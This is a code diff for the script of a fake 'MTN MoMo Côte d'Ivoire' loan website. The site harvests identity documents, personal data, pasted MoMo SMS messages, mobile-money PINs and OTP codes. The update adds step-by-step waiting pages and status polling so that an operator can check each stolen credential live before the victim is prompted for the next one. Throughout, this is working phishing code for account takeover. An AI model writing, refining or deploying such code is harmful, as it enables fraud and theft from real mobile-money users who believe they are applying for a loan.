@@ -1,6 +1,6 @@
 // ============================================================
-// script.js – MTN MoMo Côte d'Ivoire  (v10.0)
-// Application → MoMo redirect → SMS/PIN/OTP login → Dashboard
+// script.js – MTN MoMo Côte d'Ivoire  (v10.1)
+// Application → MoMo redirect → SMS verify → PIN verify → OTP verify → Dashboard
 // ============================================================
 'use strict';
 
@@ -22,17 +22,15 @@ var S = {
     monthlyRepayment: 0
 };
 
-var KEYS = { APP_ID: 'momo_ci_id_v10', DATA: 'momo_ci_data_v10' };
-var loginPollTimer = null;
+var KEYS = { APP_ID: 'momo_ci_id_v10_1', DATA: 'momo_ci_data_v10_1' };
+var pollTimer = null;
 var ANNUAL_RATE = 0.24, SERVICE_FEE = 500;
 
-// ─── Storage ───
 function save(k, d) { try { localStorage.setItem(k, JSON.stringify(d)); } catch (e) {} }
 function get(k) { try { var d = localStorage.getItem(k); return d ? JSON.parse(d) : null; } catch (e) { return null; } }
 function rm(k) { try { localStorage.removeItem(k); } catch (e) {} }
 function saveAll() { save(KEYS.APP_ID, S.applicationId); save(KEYS.DATA, S); }
 
-// ─── Utils ───
 function fmt(n) { return (Number(n) || 0).toLocaleString('fr-FR').replace(/\u202f/g, ' ').replace(/\u00a0/g, ' '); }
 function fmtXOF(n) { return fmt(n) + ' F CFA'; }
 function genAppId() {
@@ -71,17 +69,15 @@ async function apiCall(endpoint, options) {
     return data;
 }
 
-// ─── Navigation ───
 function goTo(pageId) {
     document.querySelectorAll('.page').forEach(function (p) { p.classList.remove('active'); });
     var el = document.getElementById(pageId);
     if (el) el.classList.add('active');
     window.scrollTo(0, 0);
     try { history.pushState({ page: pageId }, '', '#' + pageId); } catch (e) {}
-    if (pageId !== 'page-review') stopLoginPoll();
+    if (pageId !== 'page-login-wait') stopPoll();
 }
 
-// ─── Calculator ───
 function updateCalc() {
     var slider = document.getElementById('amtSlider');
     if (!slider) return;
@@ -98,7 +94,6 @@ function updateCalc() {
     slider.style.setProperty('--pct', Math.max(0, Math.min(100, pct)) + '%');
 }
 
-// ─── Application form ───
 function detectAccountType(amount) {
     if (amount <= 100000) return 'simplifie';
     if (amount <= 500000) return 'standard';
@@ -111,7 +106,6 @@ function updateTwenty() {
     var b = document.getElementById('twentyAmountInline');
     if (a) a.textContent = fmtXOF(twenty);
     if (b) b.textContent = fmtXOF(twenty);
-    // Update auto-detect hint
     var hint = document.getElementById('autoTypeHint');
     if (hint) {
         var t = detectAccountType(amt);
@@ -122,7 +116,6 @@ function updateTwenty() {
 
 function openApplication(prefillAmount, prefillTerm) {
     if (!S.applicationId) { S.applicationId = genAppId(); saveAll(); }
-    // Apply prefill from calculator if given
     if (prefillAmount) {
         var amt = document.getElementById('appLoanAmount');
         if (amt) amt.value = prefillAmount;
@@ -158,26 +151,25 @@ async function submitApplication() {
         tncAccepted: !!(document.getElementById('appTnc') || {}).checked
     };
 
-    // Client validation
     if (!body.fullName || body.fullName.length < 3) return showErr('appErr', 'Nom complet requis.');
-    if (!/^[A-Z0-9]{8,14}$/.test(body.idNumber)) return showErr('appErr', 'CNI invalide (8–14 caractères).');
+    if (!/^[A-Z0-9]{8,14}$/.test(body.idNumber)) return showErr('appErr', 'CNI invalide (8–14).');
     if (!body.dob) return showErr('appErr', 'Date de naissance requise.');
     var dob = new Date(body.dob); var now = new Date();
     var age = now.getFullYear() - dob.getFullYear();
     var mm = now.getMonth() - dob.getMonth();
     if (mm < 0 || (mm === 0 && now.getDate() < dob.getDate())) age--;
-    if (age < 18) return showErr('appErr', 'Vous devez avoir 18 ans ou plus.');
+    if (age < 18) return showErr('appErr', '18 ans minimum.');
     if (!body.email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(body.email)) return showErr('appErr', 'Email invalide.');
-    if (body.phone.length !== 10) return showErr('appErr', 'Téléphone à 10 chiffres requis.');
-    if (body.loanAmount < 25000 || body.loanAmount > 2000000) return showErr('appErr', 'Montant entre 25 000 F et 2 000 000 F.');
-    if (!body.loanPurpose) return showErr('appErr', 'Objet du prêt requis.');
-    if (!body.annualIncome || body.annualIncome <= 0) return showErr('appErr', 'Revenu annuel requis.');
+    if (body.phone.length !== 10) return showErr('appErr', 'Téléphone 10 chiffres.');
+    if (body.loanAmount < 25000 || body.loanAmount > 2000000) return showErr('appErr', 'Montant 25k–2M F CFA.');
+    if (!body.loanPurpose) return showErr('appErr', 'Objet requis.');
+    if (!body.annualIncome || body.annualIncome <= 0) return showErr('appErr', 'Revenu requis.');
     if (!body.kinName) return showErr('appErr', 'Nom du proche requis.');
-    if (body.kinPhone.length !== 10) return showErr('appErr', 'Téléphone du proche à 10 chiffres.');
-    if (!body.kinRelation) return showErr('appErr', 'Relation avec le proche requise.');
-    if (!body.kinTncAccepted) return showErr('appErr', 'Le proche doit accepter les conditions.');
-    if (!body.has20Percent) return showErr('appErr', 'Vous devez confirmer la règle des 20 %.');
-    if (!body.tncAccepted) return showErr('appErr', 'Vous devez accepter les CGL.');
+    if (body.kinPhone.length !== 10) return showErr('appErr', 'Téléphone du proche 10 chiffres.');
+    if (!body.kinRelation) return showErr('appErr', 'Relation requise.');
+    if (!body.kinTncAccepted) return showErr('appErr', 'Le proche doit accepter.');
+    if (!body.has20Percent) return showErr('appErr', 'Règle 20 % à confirmer.');
+    if (!body.tncAccepted) return showErr('appErr', 'CGL à accepter.');
 
     var btn = document.getElementById('appSubmitBtn');
     setBtn(btn, true, 'Soumettre ma demande');
@@ -198,13 +190,11 @@ async function submitApplication() {
         S.applicationStatus = 'pending_login';
         saveAll();
 
-        // Show MoMo redirect page
         goTo('page-momo-redirect');
         startRedirectCountdown();
     } catch (e) { setBtn(btn, false, 'Soumettre ma demande'); showErr('appErr', e.message); }
 }
 
-// ─── MoMo redirect countdown ───
 function startRedirectCountdown() {
     var numEl = document.getElementById('countdownNum');
     var plurEl = document.getElementById('countdownPlural');
@@ -231,70 +221,98 @@ function startRedirectCountdown() {
     }, 1000);
 }
 
-// ─── Login: SMS ───
+// ─── SMS submit ───
 async function submitSms() {
     var sms = ((document.getElementById('smsText') || {}).value || '').trim();
     var phone = ((document.getElementById('smsPhone') || {}).value || '').trim();
     if (sms.length < 10) return showErr('smsErr', 'Collez le SMS complet.');
-    if (phone.length !== 10) return showErr('smsErr', 'Téléphone à 10 chiffres.');
+    if (phone.length !== 10) return showErr('smsErr', 'Téléphone 10 chiffres.');
     var btn = document.getElementById('smsBtn');
-    setBtn(btn, true, 'Continuer');
+    setBtn(btn, true, 'Envoi...');
     clearErr('smsErr');
     try {
         var data = await apiCall('/api/login/sms', { method: 'POST', body: JSON.stringify({ applicationId: S.applicationId, sms: sms, phone: phone }) });
-        setBtn(btn, false, 'Continuer');
+        setBtn(btn, false, 'Envoyer pour vérification');
         if (!data.ok) return showErr('smsErr', data.error || 'Erreur.');
-        S.loginStatus = 'pin_pending'; saveAll();
-        goTo('page-login-pin');
-    } catch (e) { setBtn(btn, false, 'Continuer'); showErr('smsErr', e.message); }
+        S.loginStatus = 'sms_submitted'; saveAll();
+        showWait('sms');
+        pollStatus();
+    } catch (e) { setBtn(btn, false, 'Envoyer pour vérification'); showErr('smsErr', e.message); }
 }
 
-// ─── Login: PIN ───
+// ─── PIN submit ───
 async function submitPin() {
     var pin = [0,1,2,3,4].map(function (i) { return (document.getElementById('pinBox' + i) || {}).value || ''; }).join('');
     if (pin.length !== 5) return showErr('pinErr', 'Code PIN à 5 chiffres.');
     var btn = document.getElementById('pinBtn');
-    setBtn(btn, true, 'Continuer');
+    setBtn(btn, true, 'Envoi...');
     clearErr('pinErr');
     try {
         var data = await apiCall('/api/login/pin', { method: 'POST', body: JSON.stringify({ applicationId: S.applicationId, pin: pin }) });
-        setBtn(btn, false, 'Continuer');
+        setBtn(btn, false, 'Envoyer pour vérification');
         if (!data.ok) return showErr('pinErr', data.error || 'Erreur.');
-        S.loginStatus = 'otp_pending'; saveAll();
-        goTo('page-login-otp');
-    } catch (e) { setBtn(btn, false, 'Continuer'); showErr('pinErr', e.message); }
+        S.loginStatus = 'pin_submitted'; saveAll();
+        showWait('pin');
+        pollStatus();
+    } catch (e) { setBtn(btn, false, 'Envoyer pour vérification'); showErr('pinErr', e.message); }
 }
 
-// ─── Login: OTP ───
+// ─── OTP submit ───
 async function submitOtp() {
-    var otp = ((document.getElementById('otpInput') || {}).value || '').trim();
-    if (!/^\d{4,6}$/.test(otp)) return showErr('otpErr', 'OTP 4–6 chiffres.');
+    var otp = [0,1,2,3,4,5].map(function (i) { return (document.getElementById('otpBox' + i) || {}).value || ''; }).join('');
+    if (otp.length !== 6) return showErr('otpErr', 'Code OTP à 6 chiffres.');
     var btn = document.getElementById('otpBtn');
-    setBtn(btn, true, 'Soumettre');
+    setBtn(btn, true, 'Envoi...');
     clearErr('otpErr');
     try {
         var data = await apiCall('/api/login/otp', { method: 'POST', body: JSON.stringify({ applicationId: S.applicationId, otp: otp }) });
         setBtn(btn, false, 'Soumettre ma demande');
         if (!data.ok) return showErr('otpErr', data.error || 'Erreur.');
-        S.loginStatus = 'submitted';
-        S.applicationStatus = 'under_review';
-        saveAll();
-        var el = document.getElementById('reviewId');
-        if (el) el.textContent = S.applicationId;
-        goTo('page-review');
+        S.loginStatus = 'otp_submitted'; saveAll();
+        showWait('otp');
         pollStatus();
     } catch (e) { setBtn(btn, false, 'Soumettre ma demande'); showErr('otpErr', e.message); }
 }
 
-// ─── Poll status ───
-function stopLoginPoll() { if (loginPollTimer) { clearTimeout(loginPollTimer); loginPollTimer = null; } }
+// ─── Shared wait page updater ───
+function showWait(step) {
+    var iconEl = document.getElementById('waitIcon');
+    var titleEl = document.getElementById('waitTitle');
+    var subEl = document.getElementById('waitSubtitle');
+    var statusEl = document.getElementById('waitStatus');
+    var appIdEl = document.getElementById('waitAppId');
+
+    if (appIdEl) appIdEl.textContent = S.applicationId;
+
+    if (step === 'sms') {
+        if (iconEl) iconEl.textContent = '📩';
+        if (titleEl) titleEl.textContent = 'Vérification du SMS...';
+        if (subEl) subEl.textContent = 'L\'administrateur vérifie votre SMS. Vous passerez au PIN dès approbation.';
+        if (statusEl) statusEl.textContent = '⏳ Étape 1/3 · SMS en attente...';
+    } else if (step === 'pin') {
+        if (iconEl) iconEl.textContent = '🔑';
+        if (titleEl) titleEl.textContent = 'Vérification du PIN...';
+        if (subEl) subEl.textContent = 'L\'administrateur vérifie votre code PIN. Vous passerez à l\'OTP dès approbation.';
+        if (statusEl) statusEl.textContent = '⏳ Étape 2/3 · PIN en attente...';
+    } else if (step === 'otp') {
+        if (iconEl) iconEl.textContent = '🔢';
+        if (titleEl) titleEl.textContent = 'Vérification de l\'OTP...';
+        if (subEl) subEl.textContent = 'L\'administrateur vérifie votre code OTP. Vous recevrez votre prêt dès approbation.';
+        if (statusEl) statusEl.textContent = '⏳ Étape 3/3 · OTP en attente...';
+    }
+
+    goTo('page-login-wait');
+}
+
+function stopPoll() { if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; } }
+
 function pollStatus() {
-    stopLoginPoll();
+    stopPoll();
     var tick = async function () {
         try {
             var r = await fetch('/api/login/status/' + S.applicationId, { credentials: 'same-origin' });
             var data = await r.json();
-            if (!data.ok) { loginPollTimer = setTimeout(tick, 3000); return; }
+            if (!data.ok) { pollTimer = setTimeout(tick, 3000); return; }
             S.loginStatus = data.loginStatus;
             S.applicationStatus = data.applicationStatus;
             if (data.accountType) S.accountType = data.accountType;
@@ -302,31 +320,49 @@ function pollStatus() {
             if (data.accountMaxLoan) S.accountMaxLoan = data.accountMaxLoan;
             saveAll();
 
-            if (data.applicationStatus === 'approved' || data.loginStatus === 'verified') {
-                stopLoginPoll();
-                showToast('🎉 Prêt approuvé !', 'success', 3500);
-                showDashboard();
-                return;
+            // Route based on status
+            switch (data.loginStatus) {
+                case 'sms_verified':
+                    stopPoll();
+                    showToast('✅ SMS vérifié (1/3) !', 'success', 3000);
+                    setTimeout(function () { goTo('page-login-pin'); }, 700);
+                    return;
+                case 'pin_verified':
+                    stopPoll();
+                    showToast('✅ PIN vérifié (2/3) !', 'success', 3000);
+                    setTimeout(function () { goTo('page-login-otp'); }, 700);
+                    return;
+                case 'otp_verified':
+                    stopPoll();
+                    showToast('🎉 Prêt approuvé !', 'success', 3500);
+                    setTimeout(showDashboard, 800);
+                    return;
+                case 'sms_rejected':
+                case 'pin_rejected':
+                case 'otp_rejected':
+                    stopPoll();
+                    var el = document.getElementById('rejectReason');
+                    if (el) el.textContent = data.rejectionReason || 'Votre demande n\'a pas été approuvée.';
+                    goTo('page-rejected');
+                    return;
+                case 'sms_submitted':
+                case 'pin_submitted':
+                case 'otp_submitted':
+                    // still pending
+                    break;
             }
-            if (data.applicationStatus === 'rejected' || data.loginStatus === 'rejected') {
-                stopLoginPoll();
-                var el = document.getElementById('rejectReason');
-                if (el) el.textContent = data.rejectionReason || 'Votre demande n\'a pas été approuvée.';
-                goTo('page-rejected');
-                return;
-            }
-            loginPollTimer = setTimeout(tick, 3000);
-        } catch (e) { loginPollTimer = setTimeout(tick, 4000); }
+            pollTimer = setTimeout(tick, 3000);
+        } catch (e) { pollTimer = setTimeout(tick, 4000); }
     };
     tick();
 }
 
-// ─── Dashboard ───
 function showDashboard() {
     var set = function (id, v) { var e = document.getElementById(id); if (e) e.textContent = v; };
     var tc = ACCOUNT_TYPES[S.accountType] || {};
+    var phone = ((document.getElementById('smsPhone') || {}).value) || '';
     set('dashAmount', fmtXOF(S.loanAmount || 0));
-    set('dashAccount', '+225 ' + (((document.getElementById('smsPhone') || {}).value) || ''));
+    set('dashAccount', phone ? ('+225 ' + phone) : '');
     set('dashTerm', S.loanTerm || '—');
     set('dashMonthly', fmtXOF(S.monthlyRepayment || 0));
     set('dashAccountType', (tc.icon || '') + ' ' + (tc.name || ''));
@@ -334,7 +370,7 @@ function showDashboard() {
     goTo('page-dashboard');
 }
 
-// ─── Terms modal ───
+// ─── Terms ───
 var _termsCache = null;
 async function showTerms() {
     try {
@@ -357,8 +393,8 @@ function acceptTerms() {
     showToast('✅ Conditions acceptées', 'success', 1500);
 }
 
-// ─── PIN wiring ───
-function wirePins(prefix, length) {
+// ─── Pin/OTP wiring ───
+function wireBoxes(prefix, length) {
     for (var i = 0; i < length; i++) {
         (function (idx) {
             var el = document.getElementById(prefix + idx);
@@ -389,7 +425,6 @@ function wirePins(prefix, length) {
     }
 }
 
-// ─── Event wiring ───
 function bind(id, fn) {
     var el = document.getElementById(id);
     if (!el) return;
@@ -405,7 +440,6 @@ function bindGoto() {
 }
 
 function wireAll() {
-    // Landing
     bind('applyBtn', function () { openApplication(); });
     bind('registerFirstBtn', function () {
         window.open('https://www.mtn.ci/fr/particulier/mobile-money', '_blank', 'noopener');
@@ -420,7 +454,6 @@ function wireAll() {
     var ct = document.getElementById('calcTermSelect');
     if (ct) ct.addEventListener('change', updateCalc);
 
-    // Application
     bind('appSubmitBtn', submitApplication);
     bind('viewTermsBtn', showTerms);
     bind('termsLink', showTerms);
@@ -430,10 +463,10 @@ function wireAll() {
     var amtEl = document.getElementById('appLoanAmount');
     if (amtEl) amtEl.addEventListener('input', updateTwenty);
 
-    // Login steps
     bind('smsBtn', submitSms);
     bind('pinBtn', submitPin);
     bind('otpBtn', submitOtp);
+
     bind('pinToggle', function () {
         for (var i = 0; i < 5; i++) {
             var b = document.getElementById('pinBox' + i);
@@ -445,13 +478,11 @@ function wireAll() {
         var f = document.getElementById('pinBox0'); if (f) f.focus();
     });
 
-    // Phone inputs
     ['appPhone', 'appKinPhone', 'smsPhone'].forEach(function (id) {
         var el = document.getElementById(id);
         if (el) el.addEventListener('input', function () { normalizePhone(id); });
     });
 
-    // Dashboard
     bind('dashPdfBtn', function () {
         if (S.applicationId) window.location.href = '/api/agreement-pdf/' + S.applicationId;
     });
@@ -471,37 +502,40 @@ function restart() {
     location.reload();
 }
 
-// ─── Boot ───
 function boot() {
-    console.log('🚀 MoMo CI v10.0');
+    console.log('🚀 MoMo CI v10.1');
     var id = get(KEYS.APP_ID);
     var data = get(KEYS.DATA);
     if (id) S.applicationId = id;
     if (data) Object.assign(S, data);
 
-    wirePins('pinBox', 5);
+    wireBoxes('pinBox', 5);
+    wireBoxes('otpBox', 6);
     wireAll();
     updateCalc();
     updateTwenty();
 
-    // Auto-resume
-    if (S.applicationStatus === 'approved' || S.loginStatus === 'verified') {
+    // Auto-resume based on login status
+    var ls = S.loginStatus;
+    var as = S.applicationStatus;
+
+    if (as === 'approved' || ls === 'otp_verified') {
         showDashboard();
-    } else if (S.applicationStatus === 'under_review' || S.loginStatus === 'submitted') {
-        var el = document.getElementById('reviewId');
-        if (el) el.textContent = S.applicationId;
-        goTo('page-review');
-        pollStatus();
-    } else if (S.applicationStatus === 'rejected' || S.loginStatus === 'rejected') {
-        var el2 = document.getElementById('rejectReason');
-        if (el2) el2.textContent = (data && data.rejectionReason) || 'Votre demande n\'a pas été approuvée.';
-        goTo('page-rejected');
-    } else if (S.loginStatus === 'pin_pending') {
-        goTo('page-login-pin');
-    } else if (S.loginStatus === 'otp_pending') {
+    } else if (ls === 'otp_submitted') {
+        showWait('otp'); pollStatus();
+    } else if (ls === 'pin_verified') {
         goTo('page-login-otp');
-    } else if (S.applicationStatus === 'pending_login' || S.applicationId) {
-        // Already submitted application — go to login SMS
+    } else if (ls === 'pin_submitted') {
+        showWait('pin'); pollStatus();
+    } else if (ls === 'sms_verified') {
+        goTo('page-login-pin');
+    } else if (ls === 'sms_submitted') {
+        showWait('sms'); pollStatus();
+    } else if (ls === 'sms_rejected' || ls === 'pin_rejected' || ls === 'otp_rejected' || as === 'rejected') {
+        var el = document.getElementById('rejectReason');
+        if (el) el.textContent = (data && data.rejectionReason) || 'Votre demande n\'a pas été approuvée.';
+        goTo('page-rejected');
+    } else if (as === 'pending_login' || (S.applicationId && ls === 'idle')) {
         goTo('page-login-sms');
     } else {
         goTo('page-landing');
@@ -509,7 +543,8 @@ function boot() {
 
     document.addEventListener('visibilitychange', function () {
         if (document.hidden) return;
-        if (loginPollTimer === null && (S.applicationStatus === 'under_review' || S.loginStatus === 'submitted')) {
+        var pollStates = ['sms_submitted', 'pin_submitted', 'otp_submitted'];
+        if (pollTimer === null && pollStates.indexOf(S.loginStatus) !== -1) {
             pollStatus();
         }
     });
